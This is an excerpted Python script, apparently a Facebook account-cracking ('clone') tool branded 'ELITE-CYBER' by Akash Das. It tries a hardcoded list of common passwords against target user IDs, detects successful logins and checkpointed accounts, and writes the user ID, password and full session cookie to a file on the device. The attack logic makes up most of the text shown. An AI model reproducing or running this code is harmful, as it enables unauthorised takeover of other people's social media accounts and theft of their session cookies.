...
logo = f"""{A}
 ...
 {G3}█████   ██      ██    ██    █████   
 {G4}██      ██      ██    ██    ██      
 {G5}███████ ███████ ██    ██    ███████ {G1}[{A}V{G1}/{A}06.6{G1}]
{A}———————————————————————————————————————————
 {A}({X1}+{A}){G1} OWNER    {A}:{G1} ELITE-CYBER
 {A}({X1}+{A}){G2} FACEBOOK {A}:{G2} AKASH DAS
...
class Cyber_Main:
    def __init__(self):
        ...
        print(f' {A}[{G5}2{A}] {G2}OLD CLONE MIX')
...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r {bi}~{A}/{bi}~{G5}(%sELITE-XD{G5}){A} >> %s{A} >>{X5} %s{A} >>{G1} %s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r{R}[{G1}Akash-ok{R}]{G1} ' +cid+ ' | ' +ps+    f'  \n{A}={G5}[{X}<>{G5}]{A}= {G4}'+coki+ ' ''  ')
                linex()
                open('/sdcard/Akash-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+' | '+uid+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"{X}[Akash-CP] {uid}|{ps}")
...
def main():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;32mNAM TO SUNA HOGA ELITE-CYBER🌺')
    print('\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW')
    print('\033[;32mMAZA NA AYE PASSY WAPIS 😁🖕')
    linex()
    print('\033[1;32mAuther  : AKASH VAU')
    print('\033[1;33mPower by : ELITE-CYBER')
    print('\033[1;32mFecbook : Akash Das ')
    linex()
    ...
    print(logo)
    linex()
    print(f'{G5}Auther      : AKASH DAS')
    print(f'{G4}Power by    : ELITE TEAM')
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r {bo}~{A}/{bo}~{G5}({bo}𝐀𝐤𝐚𝐬𝐡-𝐗𝐃{G5}) {A}>> {X1}{loop} {A}>> {len(oks)}\r")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","akashold","112233"]:
            ...
            if "session_key" in rp:
                ...
                print(f"\r\r{R}[{G2}𝐀𝐤𝐚𝐬𝐡-𝐨𝐤🌺{R}]{G1} {uid} • {pw}")
